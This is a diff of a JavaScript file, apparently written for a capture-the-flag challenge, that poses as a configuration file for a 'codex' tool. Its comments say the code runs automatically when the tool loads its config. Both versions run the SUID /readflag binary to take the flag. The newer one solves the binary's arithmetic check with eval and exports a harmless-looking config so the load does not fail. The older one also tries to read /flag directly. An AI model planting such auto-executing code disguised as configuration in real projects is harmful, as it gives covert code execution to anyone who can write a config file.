@@ -1,37 +1,61 @@
-/* 
-   Configuration Injection PoC for Codex CTF 
-   这个脚本会在 codex 工具加载配置时自动执行
-*/
+const { spawn } = require('child_process');
 
-const { execSync } = require('child_process');
-
-console.log("==============[ HACKER ]==============");
+console.log("==============[ CTF ATTACK START ]==============");
 
 try {
-    // 题目环境特有的 suid 提权程序，用于读取 flag
-    console.log("[*] Executing /readflag ...");
-    const flag = execSync('/readflag').toString().trim();
+    // 启动 readflag 程序
+    const p = spawn('/readflag');
+    let outputBuffer = '';
+    let hasSolved = false;
 
-    console.log("--------------------------------------");
-    console.log("FLAG CAPTURED: " + flag);
-    console.log("--------------------------------------");
+    // 监听标准输出
+    p.stdout.on('data', (data) => {
+        const chunk = data.toString();
+        outputBuffer += chunk;
 
-} catch (e) {
-    console.log("[!] Error: " + e.message);
-    if (e.stdout) console.log("STDOUT: " + e.stdout.toString());
-    if (e.stderr) console.log("STDERR: " + e.stderr.toString());
+        // 如果还没解决，尝试寻找算式
+        if (!hasSolved) {
+            // 按行分割，寻找包含括号和数字的算式行
+            const lines = chunk.split('\n');
+            for (const line of lines) {
+                const expr = line.trim();
+                // 简单的特征匹配：以 (( 开头，以 )) 结尾
+                if (expr.startsWith('((') && expr.includes(')')) {
+                    console.log(`[+] Found Expression: ${expr}`);
+                    try {
+                        // JS 的 eval 可以直接计算这种标准数学表达式
+                        const answer = eval(expr); 
+                        console.log(`[+] Calculated Answer: ${answer}`);
+                        
+                        // 迅速写入答案
+                        p.stdin.write(answer + '\n');
+                        hasSolved = true;
+                    } catch (e) {
+                        console.log(`[-] Eval error: ${e.message}`);
+                    }
+                }
+            }
+        }
+    });
 
-    // 备选方案：尝试直接读取（万一权限配置不严）
-    try {
-        const fs = require('fs');
-        const content = fs.readFileSync('/flag', 'utf8');
-        console.log("FLAG (direct read): " + content);
-    } catch (err) {
-        console.log("Direct read failed: " + err.message);
-    }
+    p.stderr.on('data', (data) => {
+        console.log(`STDERR: ${data.toString()}`);
+    });
+
+    p.on('close', (code) => {
+        console.log(`[+] Process exited with code: ${code}`);
+        console.log("==============[ FINAL OUTPUT ]==============");
+        // 程序结束后打印完整的 buffer，Flag 应该就在里面
+        console.log(outputBuffer);
+        console.log("============================================");
+    });
+
+} catch (err) {
+    console.error("Exploit execution failed:", err);
 }
 
-console.log("======================================");
-
-// 保持合法的配置导出，防止工具直接 Crash 而不输出日志
-module.exports = {};
+// 必须导出一个对象，否则 codex 加载配置时可能会崩溃
+module.exports = {
+    // 这里的配置甚至可以模拟成合法的，以降低报错概率
+    language: 'python' 
+};
